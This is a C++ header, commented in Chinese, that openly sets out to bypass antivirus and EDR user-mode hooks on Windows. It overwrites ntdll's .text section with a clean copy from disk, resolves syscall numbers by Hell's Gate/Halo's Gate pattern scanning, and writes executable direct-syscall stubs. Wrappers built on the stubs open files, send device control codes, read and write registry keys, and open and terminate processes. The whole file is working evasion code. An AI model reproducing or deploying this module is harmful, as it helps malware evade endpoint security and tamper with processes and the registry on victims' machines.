// ============================================================================
// Syscalls - 绕过 EDR/AV 对 ntdll.dll 导出 API 的用户态 hook
// 兼容 Windows 7 SP1 ~ Windows 11 25H2 (x64)
//
// 技术栈:
//   1. Ntdll Unhooking (从磁盘读干净 ntdll.dll 覆盖 .text 段)
//   2. Hell's Gate / Halo's Gate (动态解析 syscall ID)
//   3. Direct Syscall Stub (VirtualAlloc 写 mov r10, rcx; mov eax, ID; syscall; ret)
//
// 覆盖 API:
//   - NtCreateFile / NtDeviceIoControlFile
//   - NtOpenKey / NtSetValueKey / NtQueryValueKey
//   - NtOpenProcess / NtTerminateProcess
// ============================================================================
#pragma once
#ifndef SYSCALLS_H_INCLUDED
#define SYSCALLS_H_INCLUDED

// 防止 windows.h 引入 winsock.h (与 ws2tcpip.h 冲突 -> C2011 sockaddr 重定义)
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <cstdint>
#include <cstring>
#include <vector>
#include <string>
#include <cstdio>
namespace Syscalls {

// 内联 NTSTATUS (避免依赖 winternl.h)
typedef LONG NTSTATUS;
#define SC_STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define SC_STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#define SC_STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
#define SC_STATUS_INVALID_HANDLE ((NTSTATUS)0xC0000008L)
#define SC_STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)
// SC_NT_SUCCESS: 检查 NTSTATUS 是否为成功 (0) 或信息性状态
//   与 winternl.h 的 NT_SUCCESS 等价 (高位 0x0/0x4/0x8/0xC 开头都是成功或信息)
#define SC_NT_SUCCESS(st) ((((NTSTATUS)(st)) & 0xF0000000L) == 0x00000000L)

// 内联 UNICODE_STRING
struct ScUnicodeString {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
};
typedef ScUnicodeString* PScUnicodeString;

// 内联 OBJECT_ATTRIBUTES
struct ScObjectAttributes {
    ULONG           Length;
    HANDLE          RootDirectory;
    PScUnicodeString ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
};
typedef ScObjectAttributes* PScObjectAttributes;

// 内联 IO_STATUS_BLOCK
struct ScIoStatusBlock {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR Information;
};
typedef ScIoStatusBlock* PScIoStatusBlock;

// 内联 CLIENT_ID
struct ScClientId {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
};
typedef ScClientId* PScClientId;

// 内联 KEY_VALUE_FULL_INFORMATION
struct ScKeyValueFullInfo {
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataOffset;
    ULONG DataLength;
    ULONG NameLength;
    WCHAR Name[1];
};

// ----------------------------------------------------------------------------
// 1. Hell's Gate - 解析 syscall ID
//    模式: 4C 8B D1 B8 ?? ?? ?? ?? 0F 05 C3
// ----------------------------------------------------------------------------
static DWORD ResolveSyscallId(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return 0;
    BYTE* addr = (BYTE*)GetProcAddress(hNtdll, functionName);
    if (!addr) return 0;

    if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8 &&
        addr[8] == 0x0F && addr[9] == 0x05) {
        return *(DWORD*)(addr + 4);
    }
    // Halo's Gate: 向前/后搜索
    for (int i = 1; i <= 0x80; ++i) {
        BYTE* p = addr + i;
        if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8 &&
            p[8] == 0x0F && p[9] == 0x05) {
            return *(DWORD*)(p + 4) - i;
        }
    }
    for (int i = 1; i <= 0x80; ++i) {
        BYTE* p = addr - i;
        if (p < (BYTE*)hNtdll) break;
        if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8 &&
            p[8] == 0x0F && p[9] == 0x05) {
            return *(DWORD*)(p + 4) + i;
        }
    }
    return 0;
}

static bool IsFunctionHooked(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;
    BYTE* addr = (BYTE*)GetProcAddress(hNtdll, functionName);
    if (!addr) return false;
    if (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8 &&
        addr[8] == 0x0F && addr[9] == 0x05) {
        return false;
    }
    if (addr[0] == 0xE9 || addr[0] == 0xE8 || (addr[0] == 0xFF && addr[1] == 0x25)) {
        return true;
    }
    return true;
}

// ----------------------------------------------------------------------------
// 2. Ntdll Unhooking (从磁盘读干净 ntdll.dll, 覆盖 .text 段)
// ----------------------------------------------------------------------------
static bool UnhookNtdll() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;

    wchar_t sysDir[MAX_PATH] = {};
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring path = sysDir;
    path += L"\\ntdll.dll";

    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
        OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMap = CreateFileMappingW(hFile, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    if (!hMap) { CloseHandle(hFile); return false; }

    LPVOID mapAddr = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!mapAddr) { CloseHandle(hMap); CloseHandle(hFile); return false; }

    auto dosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    auto ntHdr  = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHdr->e_lfanew);
    auto secHdr = IMAGE_FIRST_SECTION(ntHdr);

    bool ok = false;
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; ++i) {
        if (memcmp(secHdr[i].Name, ".text", 5) == 0) {
            DWORD oldProt = 0;
            LPVOID textAddr = (BYTE*)hNtdll + secHdr[i].VirtualAddress;
            SIZE_T textSize = secHdr[i].Misc.VirtualSize;
            if (!VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, &oldProt)) {
                break;
            }
            memcpy(textAddr, (BYTE*)mapAddr + secHdr[i].VirtualAddress, textSize);
            VirtualProtect(textAddr, textSize, oldProt, &oldProt);
            ok = true;
            break;
        }
    }

    UnmapViewOfFile(mapAddr);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return ok;
}

// ----------------------------------------------------------------------------
// 3. Syscall Stub 工厂
//    mov r10, rcx    3 bytes: 4C 8B D1
//    mov eax, ID     5 bytes: B8 xx xx xx xx
//    syscall         2 bytes: 0F 05
//    ret             1 byte: C3
// ----------------------------------------------------------------------------
struct SyscallStub {
    LPVOID address;
    DWORD  syscallId;

    static SyscallStub Create(const char* funcName) {
        SyscallStub s = {};
        s.syscallId = ResolveSyscallId(funcName);
        if (s.syscallId == 0) return s;

        BYTE code[11] = {
            0x4C, 0x8B, 0xD1,
            0xB8, 0x00, 0x00, 0x00, 0x00,
            0x0F, 0x05,
            0xC3
        };
        *(DWORD*)(code + 4) = s.syscallId;

        s.address = VirtualAlloc(nullptr, sizeof(code),
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (s.address) {
            memcpy(s.address, code, sizeof(code));
        }
        return s;
    }

    static void Free(SyscallStub& s) {
        if (s.address) {
            VirtualFree(s.address, 0, MEM_RELEASE);
            s.address = nullptr;
            s.syscallId = 0;
        }
    }
};

// ----------------------------------------------------------------------------
// 4. 全局 Stub 实例
// ----------------------------------------------------------------------------
namespace Stubs {
    static SyscallStub s_NtCreateFile;
    static SyscallStub s_NtDeviceIoControlFile;
    static SyscallStub s_NtOpenKey;
    static SyscallStub s_NtSetValueKey;
    static SyscallStub s_NtQueryValueKey;
    static SyscallStub s_NtOpenProcess;
    static SyscallStub s_NtTerminateProcess;

    static bool g_initialized = false;
    static bool g_unhooked = false;

    static bool Initialize() {
        if (g_initialized) return g_unhooked;
        g_unhooked = UnhookNtdll();
        s_NtCreateFile          = SyscallStub::Create("NtCreateFile");
        s_NtDeviceIoControlFile = SyscallStub::Create("NtDeviceIoControlFile");
        s_NtOpenKey             = SyscallStub::Create("NtOpenKey");
        s_NtSetValueKey         = SyscallStub::Create("NtSetValueKey");
        s_NtQueryValueKey       = SyscallStub::Create("NtQueryValueKey");
        s_NtOpenProcess         = SyscallStub::Create("NtOpenProcess");
        s_NtTerminateProcess    = SyscallStub::Create("NtTerminateProcess");
        g_initialized = true;
        return g_unhooked;
    }

    // 进程退出清理 (全局静态对象析构)
    struct AtExit {
        ~AtExit() {
            SyscallStub::Free(s_NtCreateFile);
            SyscallStub::Free(s_NtDeviceIoControlFile);
            SyscallStub::Free(s_NtOpenKey);
            SyscallStub::Free(s_NtSetValueKey);
            SyscallStub::Free(s_NtQueryValueKey);
            SyscallStub::Free(s_NtOpenProcess);
            SyscallStub::Free(s_NtTerminateProcess);
        }
    };
    static AtExit s_atexit;
} // namespace Stubs

// ----------------------------------------------------------------------------
// 5. Syscall Wrappers
// ----------------------------------------------------------------------------

// 5.1 NtCreateFile 替代 CreateFileW
static HANDLE NtCreateFileDirect(
    LPCWSTR FileName,
    ACCESS_MASK DesiredAccess,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions)
{
    if (!Stubs::g_initialized) Stubs::Initialize();

    if (Stubs::g_unhooked && Stubs::s_NtCreateFile.address) {
        ScUnicodeString us = {};
        us.Buffer = (PWSTR)FileName;
        us.Length = (USHORT)(wcslen(FileName) * sizeof(WCHAR));
        us.MaximumLength = us.Length + sizeof(WCHAR);

        ScObjectAttributes oa = {};
        oa.Length = sizeof(oa);
        oa.ObjectName = &us;
        oa.Attributes = 0x40;
        oa.RootDirectory = nullptr;

        ScIoStatusBlock iosb = {};
        LARGE_INTEGER allocSize = {};

        typedef NTSTATUS (NTAPI *Fn)(PHANDLE, ACCESS_MASK, PScObjectAttributes,
            PScIoStatusBlock, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
        Fn fn = (Fn)Stubs::s_NtCreateFile.address;

        HANDLE h = nullptr;
        NTSTATUS st = fn(&h, DesiredAccess, &oa, &iosb, &allocSize,
            FileAttributes, ShareAccess, CreateDisposition, CreateOptions, nullptr, 0);
        if (st == SC_STATUS_SUCCESS) return h;
    }
    return CreateFileW(FileName, DesiredAccess, ShareAccess, nullptr,
        CreateDisposition, FileAttributes, nullptr);
}

// 5.2 NtDeviceIoControlFile 替代 DeviceIoControl
static BOOL NtDeviceIoControlFileDirect(
    HANDLE FileHandle,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength,
    PULONG_PTR BytesReturned)
{
    if (!Stubs::g_initialized) Stubs::Initialize();

    if (Stubs::g_unhooked && Stubs::s_NtDeviceIoControlFile.address) {
        ScIoStatusBlock iosb = {};
        typedef NTSTATUS (NTAPI *Fn)(HANDLE, HANDLE, PVOID, PVOID,
            PScIoStatusBlock, ULONG, PVOID, ULONG, PVOID, ULONG);
        Fn fn = (Fn)Stubs::s_NtDeviceIoControlFile.address;
        NTSTATUS st = fn(FileHandle, nullptr, nullptr, nullptr, &iosb,
            IoControlCode, InputBuffer, InputBufferLength,
            OutputBuffer, OutputBufferLength);
        if (BytesReturned) *BytesReturned = iosb.Information;
        return st == SC_STATUS_SUCCESS;
    }
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(FileHandle, IoControlCode, InputBuffer, InputBufferLength,
        OutputBuffer, OutputBufferLength, &ret, nullptr);
    if (BytesReturned) *BytesReturned = ret;
    return ok;
}

// 5.3 NtOpenKey 替代 RegOpenKeyExW
static LSTATUS NtOpenKeyDirect(HKEY RootKey, LPCWSTR SubKey, PHKEY OutKey) {
    if (!Stubs::g_initialized) Stubs::Initialize();

    if (Stubs::g_unhooked && Stubs::s_NtOpenKey.address) {
        ScUnicodeString us = {};
        us.Buffer = (PWSTR)SubKey;
        us.Length = (USHORT)(wcslen(SubKey) * sizeof(WCHAR));
        us.MaximumLength = us.Length + sizeof(WCHAR);

        ScObjectAttributes oa = {};
        oa.Length = sizeof(oa);
        oa.ObjectName = &us;
        oa.Attributes = 0x40;
        oa.RootDirectory = RootKey;

        typedef NTSTATUS (NTAPI *Fn)(PHANDLE, ACCESS_MASK, PScObjectAttributes);
        Fn fn = (Fn)Stubs::s_NtOpenKey.address;
        // OutKey 是 PHKEY (HKEY*), NtOpenKey 第一个参数是 PHANDLE (void*),
        // 二者底层同大小 (指针), 但类型不兼容 -> 强转
        HANDLE hKey = nullptr;
        NTSTATUS st = fn(&hKey, KEY_READ | KEY_WRITE, &oa);
        if (st == SC_STATUS_SUCCESS) {
            if (OutKey) *OutKey = (HKEY)hKey;
            return ERROR_SUCCESS;
        }
        return ERROR_FILE_NOT_FOUND;
    }
    return RegOpenKeyExW(RootKey, SubKey, 0, KEY_READ | KEY_WRITE, OutKey);
}

// 5.4 NtSetValueKey 替代 RegSetValueExW
static LSTATUS NtSetValueKeyDirect(
    HKEY Key, LPCWSTR ValueName, DWORD Type, const BYTE* Data, DWORD DataSize)
{
    if (!Stubs::g_initialized) Stubs::Initialize();

    if (Stubs::g_unhooked && Stubs::s_NtSetValueKey.address) {
        ScUnicodeString us = {};
        us.Buffer = (PWSTR)ValueName;
        us.Length = (USHORT)(wcslen(ValueName) * sizeof(WCHAR));
        us.MaximumLength = us.Length + sizeof(WCHAR);

        typedef NTSTATUS (NTAPI *Fn)(HANDLE, PScUnicodeString, ULONG, ULONG,
            PVOID, ULONG);
        Fn fn = (Fn)Stubs::s_NtSetValueKey.address;
        NTSTATUS st = fn(Key, &us, 0, Type, (PVOID)Data, DataSize);
        if (st == SC_STATUS_SUCCESS) return ERROR_SUCCESS;
        return ERROR_ACCESS_DENIED;
    }
    return RegSetValueExW(Key, ValueName, 0, Type, Data, DataSize);
}

// 5.5 NtQueryValueKey 替代 RegQueryValueExW
static LSTATUS NtQueryValueKeyDirect(
    HKEY Key, LPCWSTR ValueName, DWORD* OutType,
    BYTE* OutData, DWORD* InOutDataSize)
{
    if (!Stubs::g_initialized) Stubs::Initialize();

    if (Stubs::g_unhooked && Stubs::s_NtQueryValueKey.address) {
        ScUnicodeString us = {};
        us.Buffer = (PWSTR)ValueName;
        us.Length = (USHORT)(wcslen(ValueName) * sizeof(WCHAR));
        us.MaximumLength = us.Length + sizeof(WCHAR);

        std::vector<BYTE> buf(sizeof(ScKeyValueFullInfo) + 256);
        ULONG resultLen = 0;

        typedef NTSTATUS (NTAPI *Fn)(HANDLE, PScUnicodeString, ULONG,
            PVOID, ULONG, PULONG);
        Fn fn = (Fn)Stubs::s_NtQueryValueKey.address;
        NTSTATUS st = fn(Key, &us, 2 /*KeyValueFullInformation*/, buf.data(),
            (ULONG)buf.size(), &resultLen);
        if (st == SC_STATUS_BUFFER_TOO_SMALL) {
            buf.resize(resultLen);
            st = fn(Key, &us, 2, buf.data(), (ULONG)buf.size(), &resultLen);
        }
        if (st == SC_STATUS_SUCCESS) {
            auto info = (ScKeyValueFullInfo*)buf.data();
            if (OutType) *OutType = info->Type;
            if (OutData && InOutDataSize) {
                DWORD copyLen = std::min(info->DataLength, *InOutDataSize);
                memcpy(OutData, buf.data() + info->DataOffset, copyLen);
                *InOutDataSize = copyLen;
            }
            return ERROR_SUCCESS;
        }
        return ERROR_FILE_NOT_FOUND;
    }
    return RegQueryValueExW(Key, ValueName, nullptr, OutType, OutData, InOutDataSize);
}

// 5.6 NtOpenProcess 替代 OpenProcess
static HANDLE NtOpenProcessDirect(DWORD pid, ACCESS_MASK access) {
    if (!Stubs::g_initialized) Stubs::Initialize();

    if (Stubs::g_unhooked && Stubs::s_NtOpenProcess.address) {
        ScObjectAttributes oa = {};
        oa.Length = sizeof(oa);
        ScClientId cid = {};
        cid.UniqueProcess = (HANDLE)(DWORD_PTR)pid;
        cid.UniqueThread = nullptr;

        typedef NTSTATUS (NTAPI *Fn)(PHANDLE, ACCESS_MASK, PScObjectAttributes, PScClientId);
        Fn fn = (Fn)Stubs::s_NtOpenProcess.address;
        HANDLE h = nullptr;
        NTSTATUS st = fn(&h, access, &oa, &cid);
        if (st == SC_STATUS_SUCCESS) return h;
        return nullptr;
    }
    return OpenProcess(access, FALSE, pid);
}

// 5.7 NtTerminateProcess 替代 TerminateProcess
static BOOL NtTerminateProcessDirect(HANDLE hProcess, UINT exitCode) {
    if (!Stubs::g_initialized) Stubs::Initialize();

    if (Stubs::g_unhooked && Stubs::s_NtTerminateProcess.address) {
        typedef NTSTATUS (NTAPI *Fn)(HANDLE, NTSTATUS);
        Fn fn = (Fn)Stubs::s_NtTerminateProcess.address;
        return fn(hProcess, (NTSTATUS)exitCode) == SC_STATUS_SUCCESS;
    }
    return TerminateProcess(hProcess, exitCode);
}

} // namespace Syscalls

#endif // SYSCALLS_H_INCLUDED
